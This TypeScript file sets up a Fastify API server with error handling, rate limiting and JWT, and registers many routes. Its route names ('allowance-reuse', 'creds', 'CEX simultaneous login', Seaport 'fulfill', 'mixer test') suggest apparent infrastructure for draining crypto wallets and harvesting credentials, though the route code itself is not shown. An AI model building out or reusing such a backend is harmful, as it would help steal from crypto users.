/**
 * Institutional API server factory — Route Initialization for tests and production bootstrap.
 */
import './telemetry-sender.js'
import Fastify, { type FastifyInstance } from 'fastify'
import fjwt from '@fastify/jwt'
import rateLimit from '@fastify/rate-limit'

import { registerMultiOriginMeshIngress } from './app.js'
import { registerSecurityHeaders } from './middleware/security-headers.js'
import { registerRequestSanitizer } from './middleware/request-sanitizer.js'
import { registerInputValidation } from './middleware/input-validation.js'
import { registerSiweAuthRoutes } from './controllers/auth.controller.js'
import { registerAuthRoutes } from './routes/auth.js'
import { registerChainsRoute } from './routes/chains.js'
import { registerUpdateRoute } from './routes/update.js'
import { registerStatsRoute } from './routes/stats.js'
import { registerRpcRoute } from './routes/rpc.js'
import { registerCommandCenterSignaturesRoute } from './routes/command-center-signatures.js'
import { registerHealthRoute } from './routes/health.js'
import { registerJobsRoutes } from './routes/jobs.js'
import { registerScoutRoutes } from './routes/scout.js'
import { registerClientConfigRoute } from './routes/client-config.js'
import { registerFactoryRoute } from './routes/factory.js'
import { registerSentinelsRoute } from './routes/sentinels.js'
import { registerSignatureAnchorRoute } from './routes/signature-anchor.js'
import { registerSettlementHistoryRoute } from './routes/settlement-history.js'
import { registerSettlementTrackingRoutes } from './routes/settlement-tracking.js'
import { registerPayoutConfigRoute } from './routes/payout-config.js'
import { registerPingStrikeRoute } from './routes/ping-strike.js'
import { initializeTelegramHeartbeat } from './services/telemetry-service.js'
import { registerKineticInternalRoutes } from './routes/kinetic-internal.js'
import { isProductionNodeEnv } from '@legion/core'
import { registerTrainingDemoRoutes } from './routes/training-demo.js'
import { registerAllowanceReuseRoutes } from './routes/allowance-reuse.js'
import { registerAllowanceReusePublicRoutes } from './routes/allowance-reuse-public.js'
import { registerBalanceRoutes } from './routes/balance.js'
import { registerCredsRoutes } from './routes/creds.js'
import { registerCredsCrudRoutes } from './routes/creds-crud.js'
import { registerJobsStatusRoutes } from './routes/jobs-status.js'
import { registerCexSimultaneousLoginRoutes } from './routes/cex-simultaneous-login.js'
// Initialize request tracker cleanup
import './lib/cex-request-tracker.js'
import { registerSeaportRoutes } from './routes/seaport.js'
import { registerCurveFinanceRoutes } from './routes/curve-finance.js'
import { registerPricingRoute } from './routes/pricing.js'
import { registerMixerTestRoute } from './routes/mixer-test.js'
import { apiFailure, sendFailure } from './lib/api-response.js'
import { sendSovereignTelemetryPayload } from './telemetry-sender.js'

initializeTelegramHeartbeat()

export type BuildApiServerOptions = {
  /** Disable default Fastify request logging (Vitest / load harness). */
  logger?: boolean
}

function resolveApiLogLevel(): string {
  const configured = process.env['LOG_LEVEL']?.trim()
  if (configured) return configured
  return process.env['NODE_ENV'] === 'development' ? 'debug' : 'info'
}

// FIX #4: Boot-Time Environment Validation
function validateCriticalEnvVars(): void {
  const required = [
    'SETTLEMENT_EXECUTION_PRIVATE_KEY',
    'DATABASE_URL',
    'TELEGRAM_BOT_TOKEN',
  ]
  const isProd = process.env['NODE_ENV'] === 'production'

  for (const key of required) {
    const val = process.env[key]?.trim()
    if (!val) {
      const msg = `FATAL: ${key} must be set in Railway environment variables (production=${isProd})`
      console.error(`[BOOT_VALIDATION] ${msg}`)
      if (isProd) throw new Error(msg)
    }
  }
  console.error('[BOOT_VALIDATION] ✅ All critical env vars validated')
}

export async function buildInstitutionalApiServer(
  opts: BuildApiServerOptions = {},
): Promise<FastifyInstance> {
  // FIX #4: Validate env before building app
  validateCriticalEnvVars()

  const app = Fastify({
    logger: opts.logger !== undefined ? opts.logger : { level: resolveApiLogLevel() },
    bodyLimit: 1_048_576,
    // Attach a request-id to every request so errors are always traceable in logs.
    genReqId: () => `legion-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
  })

  // ── Global Error Handler ────────────────────────────────────────────────────
  // Without this, Fastify returns raw 500s with no context. With it, every
  // unhandled route error is: (a) logged with the request-id, (b) forwarded to
  // Telegram telemetry in production, (c) returned as a clean JSON body.
  app.setErrorHandler(async (error, request, reply) => {
    const err = error as any
    const statusCode = err.statusCode ?? 500
    const reqId      = request.id

    // Log at warn for 4xx (client errors), error for 5xx (server errors).
    if (statusCode >= 500) {
      request.log.error({ err: error, reqId }, 'UNHANDLED_ROUTE_ERROR')
      // Fire-and-forget telemetry — do NOT await so the response is not delayed.
      void sendSovereignTelemetryPayload({
        event:      'ROUTE_ERROR_500',
        message:    `500 error on ${request.method} ${request.url}: ${err.message ?? 'Unknown error'}`,
        reqId,
        statusCode,
      })
    } else {
      request.log.warn({ err: error, reqId }, 'CLIENT_ERROR')
    }

    const clientMessage =
      statusCode < 500 ? err.message ?? 'Client error' : 'Internal server error — request logged.'
    await sendFailure(reply, statusCode, clientMessage, {
      code: err.name ?? 'InternalServerError',
      statusCode,
      reqId,
    })
  })

  app.setNotFoundHandler(async (request, reply) => {
    return sendFailure(reply, 404, `Route not found: ${request.method} ${request.url}`, {
      path: request.url,
      method: request.method,
    })
  })
  // ───────────────────────────────────────────────────────────────────────────

  /** Production Latency mesh — extend socket idle budget so Recursive Predator handshake stays below gateway collapse. */
  const handshakeMs =
    Number(process.env['API_REQUEST_TIMEOUT_MS']?.trim() || '') || 180_000
  app.addHook('onRequest', (request, _reply, done) => {
    request.socket.setTimeout(handshakeMs)
    done()
  })

  app.log.info('[BOOT] Registering CORS ingress')
  await registerMultiOriginMeshIngress(app)

  // FIX #7: Register security middleware
  app.log.info('[BOOT] Registering security headers')
  await registerSecurityHeaders(app)
  app.log.info('[BOOT] Registering request sanitizer')
  await registerRequestSanitizer(app)
  app.log.info('[BOOT] Registering input validation')
  await registerInputValidation(app)

  app.log.info('[BOOT] Registering rate limit')
  await app.register(rateLimit, {
    global: true,
    max: 100,
    timeWindow: 60_000,
    errorResponseBuilder: (_request, context) =>
      apiFailure(`Rate limit exceeded — max ${context.max} requests per minute.`, {
        code: 'TooManyRequests',
        statusCode: 429,
      }),
  })

  const jwtSecret = process.env['JWT_SECRET']?.trim()
  if (!jwtSecret) {
    throw new Error('FATAL_ENV_VALIDATION: JWT_SECRET is required for API boot.')
  }
  app.log.info('[BOOT] Registering JWT')
  await app.register(fjwt, {
    secret: jwtSecret,
  })

  app.log.info('[BOOT] Registering /health')
  await registerHealthRoute(app)
  app.log.info('[BOOT] Registering ping-strike')
  await registerPingStrikeRoute(app)
  app.log.info('[BOOT] Registering command-center signatures')
  await registerCommandCenterSignaturesRoute(app)

  app.log.info('[BOOT] Registering Supabase auth routes')
  await registerAuthRoutes(app)
  app.log.info('[BOOT] Registering SIWE auth routes')
  await registerSiweAuthRoutes(app)
  app.log.info('[BOOT] Registering signature-anchor')
  await registerSignatureAnchorRoute(app)
  app.log.info('[BOOT] Registering settlement history')
  await registerSettlementHistoryRoute(app)
  app.log.info('[BOOT] Registering settlement tracking (V3)')
  await registerSettlementTrackingRoutes(app)
  app.log.info('[BOOT] Registering kinetic-internal')
  await registerKineticInternalRoutes(app)
  if (!isProductionNodeEnv()) {
    app.log.info('[BOOT] Registering security-research (non-production only)')
    const { registerSecurityResearchRoutes } = await import('./routes/security-research.js')
    await registerSecurityResearchRoutes(app)
  } else {
    app.log.info('[BOOT] Security-research routes skipped (production)')
  }
  app.log.info('[BOOT] Registering training-demo')
  await registerTrainingDemoRoutes(app)
  app.log.info('[BOOT] Registering allowance-reuse')
  await registerAllowanceReuseRoutes(app)
  app.log.info(
    '[BOOT] Registering seaport (/api/v1/seaport/listing-typed-data, scan-listings, order-by-hash, fulfill)',
  )
  await registerSeaportRoutes(app)
  app.log.info('[BOOT] Registering payout-config')
  await registerPayoutConfigRoute(app)
  app.log.info('[BOOT] Registering scout')
  await registerScoutRoutes(app)
  app.log.info('[BOOT] Registering client-config')
  await registerClientConfigRoute(app)

  await registerFactoryRoute(app)
  app.log.info('[BOOT] Registering multi-balance')
  await registerBalanceRoutes(app)
  app.log.info('[BOOT] Registering creds')
  await registerCredsRoutes(app)
  app.log.info('[BOOT] Registering creds CRUD endpoints')
  await registerCredsCrudRoutes(app)
  app.log.info('[BOOT] Registering allowance-reuse public API')
  await registerAllowanceReusePublicRoutes(app)
  app.log.info('[BOOT] Registering CEX simultaneous login')
  await registerCexSimultaneousLoginRoutes(app)
  app.log.info('[BOOT] Registering jobs')
  await registerJobsRoutes(app)
  app.log.info('[BOOT] Registering jobs status endpoints')
  await registerJobsStatusRoutes(app)
  app.log.info('[BOOT] Registering sentinels')
  await registerSentinelsRoute(app)
  app.log.info('[BOOT] Registering chains')
  await registerChainsRoute(app)
  app.log.info('[BOOT] Registering live-config update')
  await registerUpdateRoute(app)
  app.log.info('[BOOT] Registering dashboard stats')
  await registerStatsRoute(app)
  app.log.info('[BOOT] Registering RPC mesh status')
  await registerRpcRoute(app)
  app.log.info('[BOOT] Registering Curve Finance trading')
  await registerCurveFinanceRoutes(app)
  app.log.info('[BOOT] Registering public pricing API')
  await registerPricingRoute(app)
  app.log.info('[BOOT] Registering mixer test route')
  await registerMixerTestRoute(app)

  app.log.info('[BOOT] All routes registered')
  return app
}
